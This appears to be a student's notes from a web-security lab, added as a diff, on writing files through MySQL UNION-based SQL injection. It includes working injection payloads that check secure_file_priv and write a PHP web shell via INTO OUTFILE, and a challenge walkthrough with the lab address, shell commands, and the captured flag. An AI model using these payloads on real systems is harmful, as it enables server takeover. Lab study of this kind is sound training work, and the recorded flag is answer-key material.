@@ -1,1 +1,52 @@
+Write File Privileges
+To be able to write files to the back-end server using a MySQL database, we require three things:
+
+User with FILE privilege enabled
+MySQL global secure_file_priv variable not enabled
+Write access to the location we want to write to on the back-end server
+We have already found that our current user has the FILE privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking the secure_file_priv global variable.
+
+but these arew normally either disabled or much more locked down than other privs. 
+
+
+secure_file_priv
+The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. However, MySQL uses /var/lib/mysql-files as the default folder. This means that reading files through a MySQL injection isn't possible with default settings. Even worse, some modern configurations default to NULL, meaning that we cannot read/write files anywhere within the system.
+
+UNION EXAMPLE: cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+
+output is empty thus were allowed to write files 
+
+Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the SELECT .. INTO OUTFILE statement
+
+To use it, we can add INTO OUTFILE '...' after our query to export the results into the file we specified. The below example saves the output of the users table into the /tmp/credentials file:
+
+EXAMPLE: SELECT * from users INTO OUTFILE '/tmp/credentials';
+
+Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
+
+Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, or IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux or this wordlist for Windows. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
+
+EXAMPLE: cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+
+then go to http://serverIP:PORT/proof.txt 
+
+so webshel lshould look like this: 
+
+SHELL: <?php system($_REQUEST[0]); ?>
+
+SQli SYNTAX: cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+
+THEN -> http://serverIP:PORT/shell.php?0=id
+
+CHALLENGE: 94.237.54.116:57703
+
+QUESTION 1 -  Find the flag by using a webshell. -> d2b5b27ae688b6a0f1d21b7d3a0798cd
+1) http://94.237.54.116:57703
+2) lets chekc and ensure we have SECURE_FILE_PRIV's -> foo' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+3)  SECURE_FILE_PRIV is empty, the current user can read and write files to any directory.
+4) foo' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
+5) confirm shell works -> http://94.237.54.116:57703/shell.phhp?cmd=id 
+6) http://94.237.54.116:57703/shell.phhp?cmd=cat%20../flag.txt   -> d2b5b27ae688b6a0f1d21b7d3a0798cd
+
+
 
